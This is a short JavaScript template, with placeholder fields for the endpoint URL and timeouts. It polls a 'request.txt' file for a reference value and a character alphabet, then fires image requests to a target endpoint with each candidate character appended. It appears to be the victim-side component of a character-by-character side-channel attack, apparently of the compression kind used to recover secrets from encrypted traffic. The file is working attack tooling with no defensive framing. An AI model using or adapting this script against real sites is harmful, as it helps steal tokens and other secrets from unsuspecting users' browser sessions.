function compare_arrays(array_1 = [], array_2 = []) {
    if (array_1.length != array_2.length)
            return false;
    for (var i=0; i<array_1.length; i++)
            if (array_1[i] != array_2[i])
                    return false;
    return true;
}

function makeRequest(iterator = 0, total = 0, alphabet = [], ref = "", timeout = %%%request_timeout%%%) {
    jQuery.get("request.txt").done(function(data) {
        var input = data.split('\n');
        if (input.length < 2) {
            setTimeout(function() {
                makeRequest(0, total, alphabet, ref)
            }, %%%error_request_timeout%%%);
            return;
        }
        var new_ref = input[0];
        var new_alphabet = input[1].split(',');
        if (!compare_arrays(alphabet, new_alphabet) || ref != new_ref) {
                setTimeout(function() {
                        makeRequest(0, total, new_alphabet, new_ref);
                }, %%%error_request_timeout%%%);
                return;
        }
        var search = alphabet[iterator];
        var request = "%%%endpoint_url%%%" + search;
        var img = new Image();
        img.src = request;
        iterator = iterator >= alphabet.length - 1 ? 0 : ++iterator;
        console.log("making request %d: %s", total++, request);
        setTimeout(function() {
                makeRequest(iterator, total, alphabet, ref);
        }, timeout);
    }).fail(function() {
        setTimeout(makeRequest(), %%%error_request_timeout%%%);
        return
    });
    return;
}

makeRequest();
